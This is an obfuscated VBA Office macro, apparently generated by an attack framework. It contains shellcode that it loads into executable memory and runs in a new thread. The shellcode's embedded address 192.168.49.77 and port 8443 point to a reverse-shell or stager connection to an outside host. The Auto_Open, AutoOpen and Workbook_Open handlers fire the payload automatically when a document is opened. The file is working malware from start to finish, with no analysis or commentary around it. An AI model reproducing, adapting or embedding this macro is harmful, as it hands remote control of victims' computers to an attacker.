#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Qelkjyjb As Long, ByVal Bpnumo As Long, ByVal Gmuum As LongPtr, Gjpumgow As Long, ByVal Smnkrgy As Long, Rikbxznb As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Balk As Long, ByVal Fjsrlmsa As Long, ByVal Cxfo As Long, ByVal Nquu As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Evuviq As LongPtr, ByRef Sdjwtcdbc As Any, ByVal Spqrj As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Qelkjyjb As Long, ByVal Bpnumo As Long, ByVal Gmuum As Long, Gjpumgow As Long, ByVal Smnkrgy As Long, Rikbxznb As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Balk As Long, ByVal Fjsrlmsa As Long, ByVal Cxfo As Long, ByVal Nquu As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Evuviq As Long, ByRef Sdjwtcdbc As Any, ByVal Spqrj As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Oiuvf As Long, Gkhjzh As Variant, Qjtbcjnjl As Long
#If Vba7 Then
	Dim  Wkzc As LongPtr, Vcmfb As LongPtr
#Else
	Dim  Wkzc As Long, Vcmfb As Long
#EndIf
	Gkhjzh = Array(252,232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,49,255,139,114,40,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,88,32,80,1,211,139,72,24,133,201,116,60,73,49, _
255,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,51,50,0,0,104,119,115,50,95,84, _
104,76,119,38,7,137,232,255,208,184,144,1,0,0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,192,168,49,77,104,2,0,32,251,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0, _
106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213, _
94,94,255,12,36,15,133,112,255,255,255,233,155,255,255,255,1,195,41,198,117,193,195,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)

	Wkzc = VirtualAlloc(0, UBound(Gkhjzh), &H1000, &H40)
	For Qjtbcjnjl = LBound(Gkhjzh) To UBound(Gkhjzh)
		Oiuvf = Gkhjzh(Qjtbcjnjl)
		Vcmfb = RtlMoveMemory(Wkzc + Qjtbcjnjl, Oiuvf, 1)
	Next Qjtbcjnjl
	Vcmfb = CreateThread(0, 0, Wkzc, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

